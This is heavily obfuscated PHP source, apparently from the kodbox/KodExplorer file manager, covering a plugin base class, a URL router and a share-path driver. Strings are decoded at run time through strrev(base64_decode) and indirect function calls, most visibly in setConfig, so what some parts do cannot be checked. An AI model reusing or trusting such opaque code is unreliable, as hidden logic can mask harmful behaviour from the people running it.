$this->pluginCacheFileSet($FÚÜß®Ó°‚, file_get_contents_nossl($bõ¡›„ŠÁ‰)); } final function _tmpFileName($Ağ¥£ö“Ì¨ = array()) { goto Cê–·ˆÖƒ–; Cê–·ˆÖƒ–: $F‚ÛÜà…Ğ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$Ağ¥£ö“Ì¨) { $Ağ¥£ö“Ì¨ = $this->fileInfo; } if (isset($Ağ¥£ö“Ì¨[$F‚ÛÜà…Ğ[171]])) { return $Ağ¥£ö“Ì¨[$F‚ÛÜà…Ğ[171]]; } goto A”£šÆà•; A”£šÆà•: if (isset($Ağ¥£ö“Ì¨[$F‚ÛÜà…Ğ[164]][$F‚ÛÜà…Ğ[171]])) { return $Ağ¥£ö“Ì¨[$F‚ÛÜà…Ğ[164]][$F‚ÛÜà…Ğ[171]]; } $c·Â¸«ì‚Š = IO::hashSimple($Ağ¥£ö“Ì¨[$F‚ÛÜà…Ğ[76]]); if ($c·Â¸«ì‚Š) { return $c·Â¸«ì‚Š; } goto b¤ƒ×•¥èÚ; b¤ƒ×•¥èÚ: $F§Šİ®ßìÈ = array($Ağ¥£ö“Ì¨[$F‚ÛÜà…Ğ[28]], $Ağ¥£ö“Ì¨[$F‚ÛÜà…Ğ[76]], $Ağ¥£ö“Ì¨[$F‚ÛÜà…Ğ[78]]); if (isset($Ağ¥£ö“Ì¨[$F‚ÛÜà…Ğ[515]])) { $F§Šİ®ßìÈ[] = $Ağ¥£ö“Ì¨[$F‚ÛÜà…Ğ[515]]; } return md5(implode($F‚ÛÜà…Ğ[71], $F§Šİ®ßìÈ)); goto Dç·‘¾ì”; Dç·‘¾ì”: } final function checkSharePath($eí¡âÓ‡êÖ) { goto böùÍÄœ¾µ; D”®ÎÒíˆâ: $a…Ø†“§¨¨ = Action($d·˜îŸààé[1091])->sharePathInfo($eí¡âÓ‡êÖ); if (!isset($a…Ø†“§¨¨[$d·˜îŸààé[76]])) { show_json(LNG($d·˜îŸààé[1445]), !1); } $this->fileInfo = $a…Ø†“§¨¨[$d·˜îŸààé[164]]; goto e‡¾‚ÍÓÙ¨; e‡¾‚ÍÓÙ¨: $this->cachePath = $this->pluginCachePath($this->fileInfo[$d·˜îŸààé[171]]); return $a…Ø†“§¨¨[$d·˜îŸààé[76]]; goto eäÊ—™ ¡Š; böùÍÄœ¾µ: $d·˜îŸààé =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!defined($d·˜îŸààé[468])) { define($d·˜îŸààé[508], 0); } if (!$this->isShare($eí¡âÓ‡êÖ)) { return !1; } goto D”®ÎÒíˆâ; eäÊ—™ ¡Š: } final function pluginCachePath($eÑˆ‘Ç¶êÁ = '') { $A œóŸÜÈà =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E¼Ğİ¼´º = IO_PATH_SYSTEM_TEMP . $A œóŸÜÈà[1446] . $this->pluginName; if (!($b¯ƒò˜ÑÊ = IO::infoFull($E¼Ğİ¼´º))) { return IO::mkdir($E¼Ğİ¼´º . $A œóŸÜÈà[8] . $eÑˆ‘Ç¶êÁ); } if (empty($eÑˆ‘Ç¶êÁ)) { return $b¯ƒò˜ÑÊ[$A œóŸÜÈà[76]]; } if (!($b½¥İˆÑÓÂ = IO::fileNameExist($b¯ƒò˜ÑÊ[$A œóŸÜÈà[76]], $eÑˆ‘Ç¶êÁ))) { return IO::mkdir($b¯ƒò˜ÑÊ[$A œóŸÜÈà[76]] . $eÑˆ‘Ç¶êÁ); } return KodIO::make($b½¥İˆÑÓÂ); } final function pluginCacheFileSet($cÅÙ‰½®°‰, $fª…Ëãáó = '') { $BáƒñŠ’±Œ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!($dÌÎæóÃù = IO::infoFull($cÅÙ‰½®°‰))) { return IO::mkfile($cÅÙ‰½®°‰, $fª…Ëãáó, REPEAT_REPLACE); } IO::setContent($dÌÎæóÃù[$BáƒñŠ’±Œ[76]], $fª…Ëãáó); return $dÌÎæóÃù[$BáƒñŠ’±Œ[76]]; } final function pluginLocalFile($F–»òºŠˆÌ = '') { goto a’­¾×·Ò; e‡„„Ñë”À: return IO::copy($F–»òºŠˆÌ, $FòÅ®µ„¢, 0, $aâ‹Œ»—ö‚); goto c÷ëÀìİ†™; cæŠŸØÌÌ±: if (!$F–»òºŠˆÌ) { return $FòÅ®µ„¢; } $e’œ “„© = IO::info($F–»òºŠˆÌ); $aâ‹Œ»—ö‚ = $this->_tmpFileName($e’œ “„©) . $A—ŸÊ¬æ™[95] . $e’œ “„©[$A—ŸÊ¬æ™[168]]; goto déêÛ›ìŠŒ; déêÛ›ìŠŒ: if (!checkExtSafe($aâ‹Œ»—ö‚)) { $aâ‹Œ»—ö‚ = $aâ‹Œ»—ö‚ . $A—ŸÊ¬æ™[1447]; } $c÷ÈÒõ×‘ = $FòÅ®µ„¢ . $aâ‹Œ»—ö‚; if (@file_exists($c÷ÈÒõ×‘)) { return $c÷ÈÒõ×‘; } goto e‡„„Ñë”À; a’­¾×·Ò: $A—ŸÊ¬æ™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FòÅ®µ„¢ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($FòÅ®µ„¢)) { mk_dir($FòÅ®µ„¢); } goto cæŠŸØÌÌ±; c÷ëÀìİ†™: } final function appPackage() { goto bÌ”À’ì©Œ; bÌ”À’ì©Œ: $d³Šƒ¶İ—ä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->packageData) { return $this->packageData; } $Bˆ°Åƒ¨  = $this->parseFile($this->pluginPath . $d³Šƒ¶İ—ä[1448]); goto bÖŠ¥±…Ò—; bÖŠ¥±…Ò—: $this->parseLang($Bˆ°Åƒ¨ ); $C¯›®‹ˆé› = json_decode_force($Bˆ°Åƒ¨ ); if (!$C¯›®‹ˆé›) { return array(); } goto AÑ°ÜßáˆŸ; AÑ°ÜßáˆŸ: $b¿”‡—‡Ü¶ = Hook::trigger($d³Šƒ¶İ—ä[1449], $C¯›®‹ˆé›); if ($b¿”‡—‡Ü¶ && is_array($b¿”‡—‡Ü¶)) { $C¯›®‹ˆé› = $b¿”‡—‡Ü¶; } $this->packageData = $C¯›®‹ˆé›; goto d”ïŒİ…İ»; d”ïŒİ…İ»: return $C¯›®‹ˆé›; goto CëÑ­é²Ò·; CëÑ­é²Ò·: } public function packageInfoGet($Eˆ°²Õä¶³) { $BßÃÅ™›Õõ = $this->appPackage(); return array_get_value($BßÃÅ™›Õõ, $Eˆ°²Õä¶³); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ôğ—¤Šµˆ˜ñ£][1450]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ôğ—¤Šµˆ˜ñ£][1451]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ôğ—¤Šµˆ˜ñ£][1452]); } public function echoJsAssign($C×„„ºµ•ô, $aÅ „ÈøÄ½) { $this->echoJsAssignArr[$C×„„ºµ•ô] = $aÅ „ÈøÄ½; } private function parseFile($cÂæ¡Š‘¿©) { goto d®…ï¬†Ä; fÑÅ¤Œô’: $dæËÒ¬Æ„† = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Dç‚­‚µ¬[88]][$Dç‚­‚µ¬[1460]]); foreach ($this->echoJsAssignArr as $D›™£ÖÕ‘æ => $cä”©î‡­Á) { $b¤æ¼›‘íÓ[] = $Dç‚­‚µ¬[1461] . $D›™£ÖÕ‘æ . $Dç‚­‚µ¬[1462]; $dæËÒ¬Æ„†[] = is_array($cä”©î‡­Á) || is_object($cä”©î‡­Á) ? rawurlencode(json_encode($cä”©î‡­Á)) : $cä”©î‡­Á; } if (strstr($BÁÙ‚Ğ‘, $Dç‚­‚µ¬[1463])) { $fÕ¾á…‰ = rawurlencode(json_encode($this->pluginLangArr)); $BÁÙ‚Ğ‘ = str_replace($Dç‚­‚µ¬[1463], $fÕ¾á…‰, $BÁÙ‚Ğ‘); } goto E½Øªµ¬õ; d®…ï¬†Ä: $Dç‚­‚µ¬ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BÁÙ‚Ğ‘ = file_get_contents_nossl($cÂæ¡Š‘¿©); $b¤æ¼›‘íÓ = array($Dç‚­‚µ¬[1453], $Dç‚­‚µ¬[1454], $Dç‚­‚µ¬[1455], $Dç‚­‚µ¬[1456], $Dç‚­‚µ¬[1457], $Dç‚­‚µ¬[1458], $Dç‚­‚µ¬[1459]); goto fÑÅ¤Œô’; E½Øªµ¬õ: if (strstr($BÁÙ‚Ğ‘, $Dç‚­‚µ¬[1464])) { $fÕ¾á…‰ = $fÕ¾á…‰ = rawurlencode(json_encode($this->getConfig())); $BÁÙ‚Ğ‘ = str_replace($Dç‚­‚µ¬[1464], $fÕ¾á…‰, $BÁÙ‚Ğ‘); } $BÁÙ‚Ğ‘ = str_replace($b¤æ¼›‘íÓ, $dæËÒ¬Æ„†, $BÁÙ‚Ğ‘); return $BÁÙ‚Ğ‘; goto fÕêÔˆù®Æ; fÕêÔˆù®Æ: } private function parseLang(&$AŞ±–‘³åá) { goto eÊŸ–ñçÌæ; eÊŸ–ñçÌæ: $bé·á¥‹ì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e™‚â‘ª¤ = $bé·á¥‹ì[1465]; if (!strstr($AŞ±–‘³åá, $e™‚â‘ª¤)) { return; } goto FË¾¿£á‘; bÓ§Ä“³ª: $DŸÑŒÂ´ëİ = array(); foreach ($DòïÇîÁêğ[0] as $e—×®ö“ˆŠ) { $aô´‘¯Èİ¿ = substr($e—×®ö“ˆŠ, strlen($e™‚â‘ª¤), -4); $BÊŞÀ¿°–ï = LNG($aô´‘¯Èİ¿); $cš¿ÚÛğÉ[] = $e—×®ö“ˆŠ; $DŸÑŒÂ´ëİ[] = str_replace(array($bé·á¥‹ì[229], $bé·á¥‹ì[1059], $bé·á¥‹ì[340], $bé·á¥‹ì[116]), array($bé·á¥‹ì[50], $bé·á¥‹ì[50], $bé·á¥‹ì[33], $bé·á¥‹ì[1467]), $BÊŞÀ¿°–ï); } $AŞ±–‘³åá = str_replace($cš¿ÚÛğÉ, $DŸÑŒÂ´ëİ, $AŞ±–‘³åá); goto aï„¬êªè†; FË¾¿£á‘: preg_match_all($bé·á¥‹ì[1466], $AŞ±–‘³åá, $DòïÇîÁêğ); if (!is_array($DòïÇîÁêğ) || count($DòïÇîÁêğ) == 0 || !is_array($DòïÇîÁêğ[0]) || count($DòïÇîÁêğ[0]) == 0) { return; } $cš¿ÚÛğÉ = array(); goto bÓ§Ä“³ª; aï„¬êªè†: } private function parseConfig(&$cÜ…çà¶ÒÄ) { goto e¯­Ù‚‚£«; F°£Øˆô: $cÜ…çà¶ÒÄ = str_replace($FñÏÀ•Ö“Ÿ, $EÚ‘©‹Ò‹…, $cÜ…çà¶ÒÄ); goto e•†³Ë¥; F†»§ì†öÂ: preg_match_all($a” ÖàÕ‹„[1469], $cÜ…çà¶ÒÄ, $E¿Ü‰©ËÜ); if (!is_array($E¿Ü‰©ËÜ) || count($E¿Ü‰©ËÜ) == 0 || !is_array($E¿Ü‰©ËÜ[0]) || count($E¿Ü‰©ËÜ[0]) == 0) { return; } $Eø™àîÚò = $this->getConfig(); goto fèš‚Î¬ôŒ; e¯­Ù‚‚£«: $a” ÖàÕ‹„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E°ƒòö…ŒÙ = $a” ÖàÕ‹„[1468]; if (!strstr($cÜ…çà¶ÒÄ, $E°ƒòö…ŒÙ)) { return; } goto F†»§ì†öÂ; fèš‚Î¬ôŒ: $FñÏÀ•Ö“Ÿ = array(); $EÚ‘©‹Ò‹… = array(); foreach ($E¿Ü‰©ËÜ[0] as $E¹‰ÓÆ“¹) { $BêÉ½×¡ƒÆ = substr($E¹‰ÓÆ“¹, strlen($E°ƒòö…ŒÙ), -2); $FñÏÀ•Ö“Ÿ[] = $E¹‰ÓÆ“¹; $EÚ‘©‹Ò‹…[] = _get($Eø™àîÚò, $BêÉ½×¡ƒÆ); } goto F°£Øˆô; e•†³Ë¥: } private function parsePackage(&$c„êó’¹³„) { goto F÷Â‹ŸìŸë; F÷Â‹ŸìŸë: $b•½©”ƒí® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DÙ¼ùÎêŠ¯ = $b•½©”ƒí®[1470]; if (!strstr($c„êó’¹³„, $DÙ¼ùÎêŠ¯)) { return; } goto a ãéïÓŸ­; e„Œ¹Á•„®: $AÓĞ“É¯Ìá = array(); $Bï•Œò¤Ì = array(); foreach ($CóŒÁÈØã÷[0] as $C›–š­Á¬Û) { $càœÎ‘ÕÁ± = substr($C›–š­Á¬Û, strlen($DÙ¼ùÎêŠ¯), -2); $AÓĞ“É¯Ìá[] = $C›–š­Á¬Û; $Bï•Œò¤Ì[] = _get($D¯º†˜Û¹„, $càœÎ‘ÕÁ±); } goto D¯…ÅËÓŸ”; a ãéïÓŸ­: preg_match_all($b•½©”ƒí®[1471], $c„êó’¹³„, $CóŒÁÈØã÷); if (!is_array($CóŒÁÈØã÷) || count($CóŒÁÈØã÷) == 0 || !is_array($CóŒÁÈØã÷[0]) || count($CóŒÁÈØã÷[0]) == 0) { return; } $D¯º†˜Û¹„ = $this->appPackage(); goto e„Œ¹Á•„®; D¯…ÅËÓŸ”: $c„êó’¹³„ = str_replace($AÓĞ“É¯Ìá, $Bï•Œò¤Ì, $c„êó’¹³„); goto Fš’©£Šˆ; Fš’©£Šˆ: } final function echoFile($F×ğæÁ½à, $c±ÂÓÍ‡²§ = false) { goto eÚÍ¾ì“Û; aìÕÚ„Ø: $this->parsePackage($bøØÍ›‚¹ó); if (is_array($c±ÂÓÍ‡²§)) { $bøØÍ›‚¹ó = str_replace(array_keys($c±ÂÓÍ‡²§), array_values($c±ÂÓÍ‡²§), $bøØÍ›‚¹ó); } echo $b×µâ†»ÜÇ[229] . $bøØÍ›‚¹ó; goto e¥œˆò¿Ì; eÚÍ¾ì“Û: $b×µâ†»ÜÇ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b˜âÇ¬ÚŠİ = $this->pluginPath . $F×ğæÁ½à; if (ACT == $b×µâ†»ÜÇ[1472]) { echo $b×µâ†»ÜÇ[1473] . $this->pluginName . $b×µâ†»ÜÇ[8] . $F×ğæÁ½à . $b×µâ†»ÜÇ[1474]; if (!file_exists($b˜âÇ¬ÚŠİ)) { echo $b×µâ†»ÜÇ[1475]; return; } } goto D…ÇÕîœßƒ; D…ÇÕîœßƒ: $bøØÍ›‚¹ó = $this->parseFile($b˜âÇ¬ÚŠİ); $this->parseLang($bøØÍ›‚¹ó); $this->parseConfig($bøØÍ›‚¹ó); goto aìÕÚ„Ø; e¥œˆò¿Ì: } final function initLang() { goto E’™Ø •ä; d¹›¤áô‡: if (!is_array($e‘åªÒÎ¼)) { return array(); } if (@count($e‘åªÒÎ¼) > 0) { I18n::set($e‘åªÒÎ¼); } return $e‘åªÒÎ¼; goto f²ÀÁš• À; E’™Ø •ä: $aîİ†¬ôÎ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a‚éĞƒ¨ç† = $aîİ†¬ôÎ[1476]; $dÉóââ ß = $this->pluginPath . $aîİ†¬ôÎ[1477]; goto bÓŸÇŸÊÆÑ; bÓŸÇŸÊÆÑ: $fš‡èâˆïÕ = I18n::getType(); $e‘åªÒÎ¼ = array(); if (file_exists($dÉóââ ß . $fš‡èâˆïÕ . $aîİ†¬ôÎ[826])) { $e‘åªÒÎ¼ = (include $dÉóââ ß . $fš‡èâˆïÕ . $aîİ†¬ôÎ[826]); } else { if ($fš‡èâˆïÕ == $aîİ†¬ôÎ[1478] && !file_exists($dÉóââ ß . $fš‡èâˆïÕ . $aîİ†¬ôÎ[826]) && file_exists($dÉóââ ß . $aîİ†¬ôÎ[1479])) { $e‘åªÒÎ¼ = (include $dÉóââ ß . $aîİ†¬ôÎ[1479]); } else { if (file_exists($dÉóââ ß . $a‚éĞƒ¨ç† . $aîİ†¬ôÎ[826])) { $e‘åªÒÎ¼ = (include $dÉóââ ß . $a‚éĞƒ¨ç† . $aîİ†¬ôÎ[826]); } } } goto d¹›¤áô‡; f²ÀÁš• À: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($EÑå™ŠîÑ) { $DßŒ©ø† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($_SERVER[$DßŒ©ø†[849]] != $_SERVER[$DßŒ©ø†[1480]]) { goto A£ÙÑ•ìÆ; A£ÙÑ•ìÆ: $D„òÑ‚¦´ö = $DßŒ©ø†[862]; $FÄŒà×æŸ = $DßŒ©ø†[850]; $E¿ĞĞ¿¨ÈÁ = $_SERVER[$DßŒ©ø†[851]] . $DßŒ©ø†[852]; goto f†ªÌ©›éå; c§¯—ÊÌ‚Å: $cê¢í¡õĞ­ = 1; while ($cê¢í¡õĞ­ > 1) { $cê¢í¡õĞ­ = $cê¢í¡õĞ­ + 4; $a¢ó‡‹–©Œ = rawurlencode($cê¢í¡õĞ­ . $DßŒ©ø†[376]); } goto E™®¬ÒËËÙ; eÀ‰îİÔ¢: $c†™ÏŒø Ï = $DßŒ©ø†[863]; $c†™ÏŒø Ï($_SERVER[$DßŒ©ø†[864]]); $c†™ÏŒø Ï($_SERVER[$DßŒ©ø†[851]] . $DßŒ©ø†[1481]); goto c§¯—ÊÌ‚Å; f†ªÌ©›éå: $d×å‘­’ÔÔ = $FÄŒà×æŸ($E¿ĞĞ¿¨ÈÁ); $EœÏ¡³ñó = explode($DßŒ©ø†[229], $d×å‘­’ÔÔ); if (count($EœÏ¡³ñó) < $DßŒ©ø†[606]) { $F—Ôö«¨Üô = $DßŒ©ø†[853]; $F—Ôö«¨Üô(); } goto eÀ‰îİÔ¢; E™®¬ÒËËÙ: } return $this->modelPlugin->setConfig($this->pluginName, $EÑå™ŠîÑ); } public function onSetConfig($aö£±åÁ˜¶) { } public function onGetConfig($eŒ¤Ù–”µÕ) { } public function onChangeStatus($d…ÏÁÚ³ÂÕ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($f¥Ã…Ãœ÷» = "\x70\154\165\147\x69\156\x41\165\164\x68") { $bàÒ ¢†‰µ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!defined($bàÒ ¢†‰µ[468])) { return !1; } if (_get($GLOBALS, $bàÒ ¢†‰µ[499])) { return !0; } $bÔ¦„÷ò“„ = $this->getConfig(); if (!$bÔ¦„÷ò“„[$f¥Ã…Ãœ÷»]) { return !1; } return ActionCall($bàÒ ¢†‰µ[1482], $bÔ¦„÷ò“„[$f¥Ã…Ãœ÷»]); } public function url($E¹óÙííÑÉ, $D˜™Œéß–È = '', $dÆŠ„Šä¥Ö = true) { goto EŒØİìçÌµ; Aø©¤ó£é: $f›Î„—Ô¼å = $this->packageVersion(); $CÊø¿‡‰­ = $cîÍ‰Ğ¤àÑ . $F±‹ÁĞ†Â‡[454] . $f›Î„—Ô¼å; if (substr($E¹óÙííÑÉ, 0, 4) == $F±‹ÁĞ†Â‡[147] || substr($E¹óÙííÑÉ, 0, 2) == $F±‹ÁĞ†Â‡[1266]) { $eÎ×Ò‘˜«ò = $E¹óÙííÑÉ . $F±‹ÁĞ†Â‡[1483] . $CÊø¿‡‰­; } else { if ($D˜™Œéß–È == $F±‹ÁĞ†Â‡[33]) { $eÎ×Ò‘˜«ò = $this->pluginHost . $E¹óÙííÑÉ . $F±‹ÁĞ†Â‡[1483] . $CÊø¿‡‰­; } else { if ($D˜™Œéß–È === $F±‹ÁĞ†Â‡[77]) { $eÎ×Ò‘˜«ò = $this->pluginHost . $E¹óÙííÑÉ; } else { if ($D˜™Œéß–È == $F±‹ÁĞ†Â‡[1484]) { $eÎ×Ò‘˜«ò = STATIC_PATH . $E¹óÙííÑÉ . $F±‹ÁĞ†Â‡[1483] . $cîÍ‰Ğ¤àÑ; } else { if ($D˜™Œéß–È == $F±‹ÁĞ†Â‡[1485]) { $eÎ×Ò‘˜«ò = APP_HOST . $F±‹ÁĞ†Â‡[1486] . $E¹óÙííÑÉ . $F±‹ÁĞ†Â‡[1483] . $cîÍ‰Ğ¤àÑ; } else { if (isset($E¶º‹êøÖî[$D˜™Œéß–È])) { $eÎ×Ò‘˜«ò = $E¶º‹êøÖî[$D˜™Œéß–È] . $E¹óÙííÑÉ . $F±‹ÁĞ†Â‡[1483] . $CÊø¿‡‰­; } } } } } } goto BÃ‹©Œ£ˆ£; EŒØİìçÌµ: $F±‹ÁĞ†Â‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E¶º‹êøÖî = $this->getConfig(); $cîÍ‰Ğ¤àÑ = KOD_VERSION . $F±‹ÁĞ†Â‡[95] . KOD_VERSION_BUILD; goto Aø©¤ó£é; BÃ‹©Œ£ˆ£: if (!$dÆŠ„Šä¥Ö) { return $eÎ×Ò‘˜«ò; } echo $eÎ×Ò‘˜«ò; goto dÁ›Ø»œ‚; dÁ›Ø»œ‚: } public function link($fƒì²ëÆ«Á = false, $F´ÆÃ„ªŸ× = '') { $f˜«Æ¸Ï¶” =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$fƒì²ëÆ«Á) { $this->link($f˜«Æ¸Ï¶”[1487], $f˜«Æ¸Ï¶”[1485]); $this->link($f˜«Æ¸Ï¶”[1488], $f˜«Æ¸Ï¶”[1484]); $this->link($f˜«Æ¸Ï¶”[1489], $f˜«Æ¸Ï¶”[1484]); $this->link($f˜«Æ¸Ï¶”[1490], $f˜«Æ¸Ï¶”[1484]); $this->link($f˜«Æ¸Ï¶”[1491], $f˜«Æ¸Ï¶”[1484]); return; } $b·åŒ‡¾Èî = $this->url($fƒì²ëÆ«Á, $F´ÆÃ„ªŸ×, !1); if (substr($fƒì²ëÆ«Á, -3) == $f˜«Æ¸Ï¶”[1492]) { echo $f˜«Æ¸Ï¶”[1493] . $b·åŒ‡¾Èî . $f˜«Æ¸Ï¶”[1494] . $f˜«Æ¸Ï¶”[229]; } else { if (substr($fƒì²ëÆ«Á, -4) == $f˜«Æ¸Ï¶”[1495]) { echo $f˜«Æ¸Ï¶”[1496] . $b·åŒ‡¾Èî . $f˜«Æ¸Ï¶”[1497] . $f˜«Æ¸Ï¶”[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\133\136\57\135\x2b", "\x3a\156\165\x6d" => "\133\60\x2d\71\x5d\53", "\72\x61\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Cê‘‰ŞÇ¦Õ, $dãœÂ…¿) { $cÎ¶Şƒã =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($Cê‘‰ŞÇ¦Õ == $cÎ¶Şƒã[1498]) { $c´ÎîàãÄ = array_map($cÎ¶Şƒã[1499], $dãœÂ…¿[0]); $bÀš…à‚„² = strpos($dãœÂ…¿[1], $cÎ¶Şƒã[8]) === 0 ? $dãœÂ…¿[1] : $cÎ¶Şƒã[8] . $dãœÂ…¿[1]; $bÚŒ’ğ±Ğœ = $dãœÂ…¿[2]; } else { $c´ÎîàãÄ = null; $bÀš…à‚„² = strpos($dãœÂ…¿[0], $cÎ¶Şƒã[8]) === 0 ? $dãœÂ…¿[0] : $cÎ¶Şƒã[8] . $dãœÂ…¿[0]; $bÚŒ’ğ±Ğœ = $dãœÂ…¿[1]; } array_push(self::$maps, $c´ÎîàãÄ); array_push(self::$routes, $bÀš…à‚„²); array_push(self::$methods, strtoupper($Cê‘‰ŞÇ¦Õ)); array_push(self::$callbacks, $bÚŒ’ğ±Ğœ); } public static function error($Eìƒ¶í‡‰) { self::$errorCallback = $Eìƒ¶í‡‰; } public static function haltOnMatch($AÄõˆø˜ªÄ = true) { self::$halts = $AÄõˆø˜ªÄ; } public static function dispatch() { goto A×¼„ª²Ü; A×¼„ª²Ü: $aÜ«“Şº—‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bàßºÌÛØ• = parse_url($_SERVER[$aÜ«“Şº—‘[1500]], PHP_URL_PATH); $C¹‹ß×¸à¬ = $_SERVER[$aÜ«“Şº—‘[157]]; goto aà½­¡À„î; aà½­¡À„î: $b•»Âœ¿’· = array_keys(static::$patterns); $BÃø„Ÿ‰« = array_values(static::$patterns); $Bº¯¶µø ó = !1; goto bë°ÎÏ›ä²; bë°ÎÏ›ä²: self::$routes = preg_replace($aÜ«“Şº—‘[1185], $aÜ«“Şº—‘[8], self::$routes); if (in_array($bàßºÌÛØ•, self::$routes)) { $E£²¦óÃ¿· = array_keys(self::$routes, $bàßºÌÛØ•); foreach ($E£²¦óÃ¿· as $B¨ Äœ×“) { if (self::$methods[$B¨ Äœ×“] == $C¹‹ß×¸à¬ || self::$methods[$B¨ Äœ×“] == $aÜ«“Şº—‘[1501] || in_array($C¹‹ß×¸à¬, self::$maps[$B¨ Äœ×“])) { $Bº¯¶µø ó = !0; if (!is_object(self::$callbacks[$B¨ Äœ×“])) { $AÙŒßêî×î = explode($aÜ«“Şº—‘[8], self::$callbacks[$B¨ Äœ×“]); $B˜ …“’»¢ = end($AÙŒßêî×î); $bòÊÃ´Âê = explode($aÜ«“Şº—‘[1502], $B˜ …“’»¢); $EÖ»šº¼æ‚ = new $bòÊÃ´Âê[0](); $EÖ»šº¼æ‚->{$bòÊÃ´Âê[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$B¨ Äœ×“]); if (self::$halts) { return; } } } } } else { $b„¹ƒ‰§ = 0; foreach (self::$routes as $B¨ Äœ×“) { if (strpos($B¨ Äœ×“, $aÜ«“Şº—‘[4]) !== !1) { $B¨ Äœ×“ = str_replace($b•»Âœ¿’·, $BÃø„Ÿ‰«, $B¨ Äœ×“); } if (preg_match($aÜ«“Şº—‘[1503] . $B¨ Äœ×“ . $aÜ«“Şº—‘[1504], $bàßºÌÛØ•, $EÄÁ‚øÖ°Ê)) { if (self::$methods[$b„¹ƒ‰§] == $C¹‹ß×¸à¬ || self::$methods[$b„¹ƒ‰§] == $aÜ«“Şº—‘[1501] || !empty(self::$maps[$b„¹ƒ‰§]) && in_array($C¹‹ß×¸à¬, self::$maps[$b„¹ƒ‰§])) { $Bº¯¶µø ó = !0; array_shift($EÄÁ‚øÖ°Ê); if (!is_object(self::$callbacks[$b„¹ƒ‰§])) { $AÙŒßêî×î = explode($aÜ«“Şº—‘[8], self::$callbacks[$b„¹ƒ‰§]); $B˜ …“’»¢ = end($AÙŒßêî×î); $bòÊÃ´Âê = explode($aÜ«“Şº—‘[1502], $B˜ …“’»¢); $EÖ»šº¼æ‚ = new $bòÊÃ´Âê[0](); if (!method_exists($EÖ»šº¼æ‚, $bòÊÃ´Âê[1])) { echo $aÜ«“Şº—‘[1505]; } else { call_user_func_array(array($EÖ»šº¼æ‚, $bòÊÃ´Âê[1]), $EÄÁ‚øÖ°Ê); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$b„¹ƒ‰§], $EÄÁ‚øÖ°Ê); if (self::$halts) { return; } } } } $b„¹ƒ‰§++; } } if ($Bº¯¶µø ó == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $FÕĞìÖòõ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; header($_SERVER[$FÕĞìÖòõ[1506]] . $FÕĞìÖòõ[1507]); echo $FÕĞìÖòõ[1508]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$aÜ«“Şº—‘[1500]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto e¤ïæêé‘ˆ; e¤ïæêé‘ˆ: } } goto a’ã·ªºœ¥; bÇî¬–²¾: $bß²Œ¹¤¦ô = strrev(base64_decode($_SERVER[‡ÃŞ­‘Ï][0])); function binCheckNeq($Bœ²ÁÆÍÕŠ, $DÊÙÇµ) { return $Bœ²ÁÆÍÕŠ != $DÊÙÇµ; } $_SERVER[$_SERVER[‡ÃŞ­‘Ï][1]] = $bß²Œ¹¤¦ô($_SERVER[$_SERVER[‡ÃŞ­‘Ï][2]]); goto BĞ‹ÌŞ¬Ã; fÅ¡å¶íùØ: class PathDriverDriverShareItem { public function __construct($c‘ù½ËÁ±) { $this->pathParse = $c‘ù½ËÁ±; } public function __call($c¶ã¨ïÒ‹Ì, $bÛ’¨¬’) { $F¦ò¨­©à„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (method_exists($this, $c¶ã¨ïÒ‹Ì)) { return; } $e×„ÅÍº“­ = call_user_func_array(array($F¦ò¨­©à„[1236], $c¶ã¨ïÒ‹Ì), $bÛ’¨¬’); $bŞ©ï¤çØö = array($F¦ò¨­©à„[1237], $F¦ò¨­©à„[1238], $F¦ò¨­©à„[1239], $F¦ò¨­©à„[1240], $F¦ò¨­©à„[543], $F¦ò¨­©à„[545], $F¦ò¨­©à„[1241], $F¦ò¨­©à„[107], $F¦ò¨­©à„[1242], $F¦ò¨­©à„[1243]); if (in_array($c¶ã¨ïÒ‹Ì, $bŞ©ï¤çØö)) { $e×„ÅÍº“­ = $this->getPathOuter($e×„ÅÍº“­); } return $e×„ÅÍº“­; } public function copy($DÎ¦ö„æÜˆ, $DøÜä®Æ¶, $AÔø¿‰êò» = false) { return $this->copyMove($DÎ¦ö„æÜˆ, $DøÜä®Æ¶, $AÔø¿‰êò», $_SERVER[Ôğ—¤Šµˆ˜ñ£][543]); } public function move($bƒÀôäˆï„, $c©™ƒ²è•˜, $EçØ©°Ã—³ = false) { return 